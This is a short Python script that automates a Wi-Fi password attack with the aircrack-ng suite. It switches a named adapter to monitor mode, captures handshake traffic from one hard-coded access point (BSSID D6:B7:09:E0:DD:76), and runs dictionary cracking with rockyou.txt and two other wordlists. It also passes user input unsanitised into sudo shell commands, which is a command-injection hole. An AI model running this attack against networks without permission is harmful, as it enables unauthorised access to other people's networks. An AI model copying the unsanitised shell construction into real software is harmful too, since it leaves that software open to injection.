import os
os.system("sudo ifconfig wlx0036765536d1 down && sudo ifconfig wlx0036765536d1 down && sudo iwconfig wlx0036765536d1 mode monitor && sudo ifconfig wlx0036765536d1 up && sudo ifconfig wlx0036765536d1 up && sudo ifconfig wlx0036765536d1 up");
os.system("sudo airodump-ng wlx0036765536d1");
ch=input("Enter channel : ");
os.system("sudo ifconfig wlx0036765536d1 down && sudo ifconfig wlx0036765536d1 down && sudo iwconfig wlx0036765536d1 mode monitor && sudo iwconfig wlx0036765536d1  channel '"+ch+"' && sudo ifconfig wlx0036765536d1 up && sudo ifconfig wlx0036765536d1 up && sudo ifconfig wlx0036765536d1 up");
os.system("sudo airodump-ng wlx0036765536d1 --bssid D6:B7:09:E0:DD:76 --channel '"+ch+"' -w wifi");
os.system("sudo aircrack-ng wifi-01.cap -w rockyou.txt");
os.system("sudo aircrack-ng wifi-01.cap -w word.txt");
os.system("sudo aircrack-ng wifi-01.cap -w last.txt");
